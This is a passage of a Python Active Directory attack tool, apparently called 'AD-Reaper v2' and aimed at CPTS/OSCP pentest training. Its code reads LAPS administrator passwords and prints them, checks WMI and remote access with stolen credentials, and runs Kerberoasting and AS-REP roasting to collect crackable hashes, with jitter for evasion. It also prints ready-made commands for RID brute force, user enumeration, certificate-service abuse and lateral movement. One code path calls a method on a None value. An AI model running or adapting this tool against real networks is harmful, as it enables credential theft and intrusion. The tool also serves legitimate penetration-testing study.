    return search_base, user_groups, findings, user_list

def find_ad_misconfigs_auth(target_ip, domain, username, password, lmhash, nthash, search_base):
    """
    Checks for common, high-impact misconfigurations via authenticated LDAP.
    Returns a dictionary of findings (unconstrained delegation, LAPS).
    """
    if not search_base:
        print_info("Skipping misconfig check (no search_base)")
        return {}

    findings = {'unconstrained_delegation': [], 'laps_readable': []}
    print_section("AD Misconfiguration Check")
    user_dn = f"{domain}\\{username}" if domain else username
    try:
        server = Server(target_ip, get_info=ALL)
        conn = Connection(server, user=user_dn, password=password if password else None, authentication=NTLM, auto_bind=True)

        print_info("Checking for user accounts with Unconstrained Delegation...")
        delegation_filter = '(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(objectClass=computer)))'
        conn.search(search_base, delegation_filter, attributes=['sAMAccountName', 'objectClass'], paged_size=500)  # Paged
        if not conn.entries:
            print_secure("  -> No user accounts with Unconstrained Delegation found.")
        else:
            for entry in conn.entries:
                print_success(f"  -> VULNERABLE: {entry.sAMAccountName.value} (User) has Unconstrained Delegation!")
                findings['unconstrained_delegation'].append(entry.sAMAccountName.value)

        print_info("Checking for readable LAPS passwords...")
        laps_attrs = ['sAMAccountName', 'ms-Mcs-AdmPwd', 'msLAPS-Password']
        conn.search(search_base, '(objectClass=computer)', attributes=laps_attrs, paged_size=500)
        found_laps = False
        for entry in conn.entries:
            laps_pw = entry.get('ms-Mcs-AdmPwd') or entry.get('msLAPS-Password')
            if laps_pw and laps_pw.value:
                print_vuln(f"  -> VULNERABLE: Can read LAPS password for {entry.sAMAccountName.value}: {laps_pw.value}")
                found_laps = True
                findings['laps_readable'].append(entry.sAMAccountName.value)
        if not found_laps:
            print_secure("  -> No readable LAPS passwords found.")
        else:
            print_info("Note: Checked both legacy 'ms-Mcs-AdmPwd' and modern 'msLAPS-Password'")

        conn.unbind()
    except Exception as e:
        if 'invalid attribute type' in str(e):
            print_fail("  -> LAPS attributes not found in schema (legacy env?)")
        else:
            print_error(f"Misconfig check failed: {e}")
    return findings

def check_access_paths_auth(target_ip, user_groups, username, password, lmhash, nthash, domain):
    """Checks for RDP, WinRM, and WMI access with credentials."""
    print_section("Remote Access Check")

    # Port checks
    for port, name in [(5985, "WinRM"), (3389, "RDP"), (135, "WMI/RPC"), (1433, "MSSQL")]:
        status = f"{Style.GREEN}OPEN{Style.RESET}" if check_port(target_ip, port) else f"{Style.RED}CLOSED{Style.RESET}"
        print(f"  > {name} ({port}): {status}")

    # WMI Access Check
    if check_port(target_ip, 135):
        print_info("  -> Port 135 is open, attempting WMI authentication...")
        try:
            dcom = dcomrt.DCOMConnection(target_ip, username, password, domain, lmhash, nthash, oxidResolver=True)
            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
            print_success("  -> WMI Access is CONFIRMED (wmiexec.py should work)")
            iWbemLevel1Login.RemRelease()
            dcom.disconnect()
        except Exception as e:
            if "rpc_s_access_denied" in str(e).lower() or "access denied" in str(e).lower():
                print_error("  -> WMI Access DENIED (Creds rejected)")
            else:
                print_error(f"  -> WMI Auth check failed: {e}")

    # Group correlation
    flat_groups = [g.lower() for g in user_groups]
    if check_port(target_ip, 5985) and any(x in flat_groups for x in ['remote management users', 'administrators']):
        print_success("  -> WinRM Access LIKELY (Group Membership Match)")
    if check_port(target_ip, 3389) and any(x in flat_groups for x in ['remote desktop users', 'administrators']):
        print_success("  -> RDP Access LIKELY (Group Membership Match)")

# --- Post-Scan Suggestions ---

def print_suggestions(target_ip, findings, auth_creds=None):
    """Prints a list of suggested follow-up commands based on scan findings."""
    
    print_section("Actionable Suggestions")
    
    # Use a flag to check if any suggestions were printed
    suggestions_made = False
    domain = findings.get('domain_name', 'lab.local')

    # Check for ADCS SPNs first
    adcs_spns_found = []
    if 'spns' in findings:
        spn_list = [s if isinstance(s, str) else s.get('spn', '') for s in findings['spns']]
        adcs_spns_found = [s for s in spn_list if s.lower().startswith(('adcs/', 'http/', 'certsrv/'))]

    if adcs_spns_found:
        print(f"{Style.YELLOW}[!] Active Directory Certificate Services (ADCS) SPN Found:{Style.RESET}")
        ca_name = adcs_spns_found[0].split('/')[1].split('.')[0] if '/' in adcs_spns_found[0] else 'DEFAULT-CA'
        print("  An SPN for ADCS was found. This indicates the presence of a Certificate Authority.")
        print("  You should enumerate it for misconfigurations (e.g., ESC1, ESC8) using Certipy.")
        print(f"  > {Style.CYAN}certipy find -u '{auth_creds.get('username', '<user>')}@{domain}' -p '{auth_creds.get('password', '<pass>')}' -dc-ip {target_ip} -ca '{ca_name}'{Style.RESET}\n")
        suggestions_made = True

    if findings.get('unconstrained_delegation'):
        print(f"{Style.YELLOW}[!] Unconstrained Delegation Found:{Style.RESET}")
        print("  The following accounts can impersonate users on any service on their host.")
        print("  If you gain control of one, you can capture TGTs from incoming authentications (e.g., from Domain Admins).")
        print("  > Consider using tools like BloodHound to visualize attack paths or manually check for printer spooler abuse.\n")
        suggestions_made = True

    if findings.get('laps_readable'):
        print(f"{Style.YELLOW}[!] Readable LAPS Passwords Found:{Style.RESET}")
        print("  You have permissions to read local administrator passwords for some machines.")
        print("  > Use these credentials for lateral movement with tools like evil-winrm, psexec.py, or smbexec.py.\n")
        suggestions_made = True

    if findings.get('admin_users'):
        print(f"{Style.YELLOW}[!] Privileged Accounts (adminCount=1) Identified:{Style.RESET}")
        print("  These accounts are or were members of privileged groups.")
        print("  > They are high-value targets for credential theft and lateral movement.\n")
        suggestions_made = True

    if findings.get('no_users_found'):
        print(f"{Style.YELLOW}[!] No Users Found via Anonymous Enumeration:{Style.RESET}")
        print("  Standard enumeration failed to find users. You can try to discover them")
        print("  by brute-forcing Relative IDs (RIDs).")
        print(f"  > {Style.CYAN}nxc smb {target_ip} -u guest -p '' --rid-brute | grep SidTypeUser | cut -d'\\' -f2 | cut -d' ' -f1 | tee users.txt {Style.RESET}\n")
        print("  Manualy prune 'users.txt and attempt Kerbaroast:")
        print(f"  > {Style.CYAN}for user in $(cat users.txt); do GetNPUsers.py -no-pass -dc-ip {target_ip} {domain}/$user | grep krb5asrep; done {Style.RESET}\n")
        print("  If netexec fails to find anything, kerbrute it:")
        print(f"  > {Style.CYAN} kerbrute userenum -d {domain} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc {target_ip}{Style.RESET}\n")
        suggestions_made = True

    if findings.get('sensitive_files_found'):
        print(f"{Style.YELLOW}[!] Sensitive Files Found on Anonymous SMB Share:{Style.RESET}")
        print("  Files with sensitive extensions (.xml, .config, etc.) were found.")
        print("  You should manually inspect them for credentials or configuration details.")
        print(f"  > {Style.CYAN}smbclient //{target_ip}/<SHARE> -U '' -N -c 'get <path/to/file>'{Style.RESET}\n")
        suggestions_made = True

    if not suggestions_made:
        print_info("No specific vulnerabilities found to generate suggestions for.")

# --- Main Execution Logic ---

def run_anonymous_scan(target_ip, users_file=None, hash_format='hashcat', output_dir=None, no_roast=False, jitter=0, spider_shares=False):
    """
    Orchestrates the anonymous scanning modules: SMB null session, LDAP anonymous,
    SAMR enumeration, and AS-REP roasting check.
    """
    findings = {}
    print_section("SMB Anonymous Enumeration")
    findings['sensitive_files_found'] = check_smb_null_session(target_ip, spider_shares)

    print_section("LDAP Anonymous Enumeration")
    domain_dn, ldap_users, spns = query_ldap_anonymous(target_ip, output_dir)
    findings['domain_dn'] = domain_dn
    findings['spns'] = spns
    if domain_dn:
        findings['domain_name'] = dn_to_dns(domain_dn)

    print_section("SAMR Anonymous Enumeration")
    samr_users = enumerate_users_samr(target_ip, output_dir)

    master_user_set = set(ldap_users) | set(samr_users)
    if master_user_set and output_dir:
        with open(Path(output_dir) / "ad_users.txt", "w") as f:
            for user in sorted(master_user_set):
                f.write(f"{user}\n")
        print_info("Full user list saved to ad_users.txt")
    else:
        findings['no_users_found'] = True

    print_section("AS-REP Roasting Check")
    user_list = list(master_user_set)
    if users_file:
        try:
            with open(users_file, 'r') as f:
                user_list = [line.strip() for line in f if line.strip()]
            print_info(f"Targeting {len(user_list)} users from {users_file} for AS-REP")
        except Exception as e:
            print_error(f"Failed to load users_file: {e}")
    findings['asrep_users'] = check_asrep_roastable_users(target_ip, domain_dn, user_list, hash_format, output_dir, no_roast, jitter)
    if spns:
        print_section("Kerberoasting")
        print_error("Kerberoasting requires auth creds - skipping in anonymous mode")
    return findings

def run_authenticated_scan(target_ip, username, password, lmhash, nthash, domain=None, hash_format='hashcat', output_dir=None, rc4_only=False, no_roast=False, jitter=0):
    """
    Orchestrates the authenticated scanning modules: LDAP enumeration, SMB shares,
    misconfiguration checks, and Kerberoasting.
    """
    findings = {}
    p_domain, user = parse_identity(username)

    # Honor --domain flag first
    if domain:
        print_info(f"Using domain from --domain flag: {domain}")
    elif p_domain:
        domain = p_domain
        print_info(f"Using domain parsed from username: {domain}")
    else:
        print_info("No domain in username or --domain → trying LDAP discovery...")
        discovered = get_domain_from_ldap(target_ip, username, password, lmhash, nthash)
        if discovered:
            domain = discovered
        else:
            print_error("LDAP discovery failed even with creds. Please supply --domain <FQDN>")
            sys.exit(1)


    search_base, user_groups, ldap_findings, user_list = enumerate_ldap_auth(target_ip, domain, user, password, lmhash, nthash, output_dir)
    
    if user_list and output_dir:
        with open(Path(output_dir) / "ad_users.txt", "w") as f:
            for u in sorted(user_list):
                f.write(f"{u}\n")
        print_info("Full user list saved to ad_users.txt")

    findings.update(ldap_findings)
    if search_base:
        misconfig_findings = find_ad_misconfigs_auth(target_ip, domain, username, password, lmhash, nthash, search_base)
        findings.update(misconfig_findings)
        findings['domain_name'] = dn_to_dns(search_base)

    enumerate_smb_shares_auth(target_ip, domain, user, password, lmhash, nthash)

    check_access_paths_auth(target_ip, user_groups, user, password, lmhash, nthash, domain)

    spn_list = findings.get('spns', [])
    spn_users = []

    for item in spn_list:
        if isinstance(item, dict):
            # Pull the actual sAMAccountName / user that owns the SPN
            account = item.get('user') or item.get('sAMAccountName') or item.get('name')
            if account and isinstance(account, str):
                spn_users.append(account)
        elif isinstance(item, str):
            # Legacy fallback — try to guess username from SPN string
            print_info(f"Legacy SPN string: {item} — attempting parse")
            parts = item.split('/')
            if len(parts) > 1:
                guessed = parts[1].split('@')[0].split('.')[0]
                spn_users.append(guessed)

    if spn_users:
        spn_users = list(set(spn_users))
        print_info(f"Preparing to Kerberoast {len(spn_users)} accounts: {', '.join(spn_users)}")
        
        print_section("Kerberoasting Hashes")
        roaster = GetUserSPNs(user, password, domain, lmhash, nthash, target_ip, rc4_only, hash_format)
        roaster.roast(spn_users, output_dir, jitter, no_roast)
    else:
        print_info("No valid usernames extracted from SPNs for roasting")
    return findings

def get_domain_from_ldap(target_ip, username=None, password=None, lmhash=None, nthash=None):
    """
    Discover domain FQDN via LDAP RootDSE query.
    Tries anonymous bind first; if that fails and creds are provided, uses authenticated bind.
    Returns domain FQDN (e.g., 'forest.htb') or None on failure.
    """
    print_info(f"Discovering domain from {target_ip} via LDAP RootDSE...")

    server = Server(target_ip, get_info=ALL)
    conn = None
    try:
        # First, try anonymous
        conn = Connection(server, authentication=ANONYMOUS, auto_bind=True)
        print_success("Anonymous bind worked for discovery")

    except (LDAPInvalidCredentialsResult, LDAPSocketOpenError) as anon_err:
        print_error(f"Anonymous bind failed: {anon_err} — trying authenticated if creds available...")
        if username and (password or (lmhash and nthash)):
            user_dn = f"{username}"  # Adjust if needed for DOMAIN\user
            try:
                conn = Connection(
                    server,
                    user=user_dn,
                    password=password,
                    authentication=NTLM,
                    lm_hash=lmhash,
                    nt_hash=nthash,
                    auto_bind=True
                )
                print_success("Authenticated bind worked for discovery")
            except Exception as auth_err:
                print_error(f"Authenticated bind failed: {auth_err}")
                return None
        else:
            print_error("No creds provided for authenticated discovery — cannot proceed")
            return None

    except Exception as e:
        print_error(f"LDAP connection failed: {e}")
        return None

    try:
        conn.search('', '(objectClass=*)', BASE, attributes=['defaultNamingContext'])
        if conn.entries and 'defaultNamingContext' in conn.entries[0]:
            dn = conn.entries[0].defaultNamingContext.value
            fqdn = dn_to_dns(dn)
            if fqdn:
                print_success(f"Discovered domain FQDN: {fqdn}")
                return fqdn
            else:
                print_error("Could not convert DN to FQDN")
        else:
            print_error("No RootDSE info found")
    except Exception as e:
        print_error(f"RootDSE query failed: {e}")
    finally:
        if conn:
            conn.unbind()

    return None

# ---- Main ----

def main():
    parser = argparse.ArgumentParser(
        description="AD-Reaper v2 - upgraded for CPTS / OSCP",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
Examples:
  Anonymous scan:
    python ad-reaper.py 10.10.10.10

  Auth + targeted roasting:
    python ad-reaper.py 10.10.10.10 -u corp.local/jdavis -p Winter2025 --users-file interesting_users.txt --rc4-only

  PTH + output dir:
    python ad-reaper.py 10.10.10.10 -u Administrator -H aad3b...:31d6... --output loot
        """
    )

    parser.add_argument("target", help="DC IP")

    g = parser.add_argument_group("Authentication")
    g.add_argument("-u", "--username",   help="domain\\user or user@domain")
    g.add_argument("-p", "--password",   help="password")
    g.add_argument("-H", "--hashes",     help="LM:NT hash")
    g.add_argument("-d", "--domain",     help="Force domain name (useful when discovery fails)")

    g = parser.add_argument_group("Roasting & Output")
    g.add_argument("--hash-format",      choices=['john','hashcat'], default='hashcat')
    g.add_argument("-o", "--output",     default="reaper-logs", help="Output dir for logs and hashes (default: reaper-logs)")
    g.add_argument("--no-logging",       action="store_true", help="Disable file logging (logs and hashes)")
    g.add_argument("--users-file",       help="Target only these users for AS-REP roasting")
    g.add_argument("--rc4-only",         action="store_true", help="Force RC4 for Kerberoasting")
    g.add_argument("--no-roast",         action="store_true", help="Report roastable users without requesting tickets")
    g.add_argument("--jitter",           type=float, default=0, help="Delay (seconds) jitter for roasting requests (evasion)")
    g.add_argument("--spider-shares",    action="store_true", help="Recursively list files on accessible SMB shares (anonymous)")


    args = parser.parse_args()

    try:
        ipaddress.ip_address(args.target)
    except:
        print_error(f"Invalid IP: {args.target}")
        sys.exit(1)

    is_auth = bool(args.username and (args.password or args.hashes))
    outdir = None

    if not args.no_logging:
        outdir = Path(args.output)
        outdir.mkdir(parents=True, exist_ok=True)
        
        log_name = "reaper_auth.log" if is_auth else "reaper_anon.log"
        log_file = outdir / log_name

        class Tee(object):
            def __init__(self, name, mode):
                self.file = open(name, mode)
                self.stdout = sys.stdout
            def write(self, data):
                self.stdout.write(data)
                self.file.write(data)
                self.file.flush()
            def flush(self):
                self.stdout.flush()
                self.file.flush()
            def close(self):
                self.file.close()
        sys.stdout = Tee(log_file, 'w')


    if is_auth:
        domain = args.domain or ''
        pw   = args.password or ""
        lmh, nth = ("","")
        if args.hashes:
            lmh, nth = parse_hashes(args.hashes)

        print_section(f"Authenticated Scan → {args.target} @ {domain}\\{args.username.split('/')[-1]}")

        findings = run_authenticated_scan(args.target, args.username, pw, lmh, nth, domain, args.hash_format, outdir, args.rc4_only, args.no_roast, args.jitter)
        auth_creds = {'username': args.username, 'password': pw, 'lmhash': lmh, 'nthash': nth}
        print_suggestions(args.target, findings, auth_creds)
    else:
        print_section(f"Anonymous Scan → {args.target}")
        findings = run_anonymous_scan(args.target, args.users_file, args.hash_format, outdir, args.no_roast, args.jitter, args.spider_shares)
        print_suggestions(args.target, findings)

    print_section("Scan finished")
    if outdir:
        print(f"Output logged to {outdir}")

if __name__ == "__main__":
    main()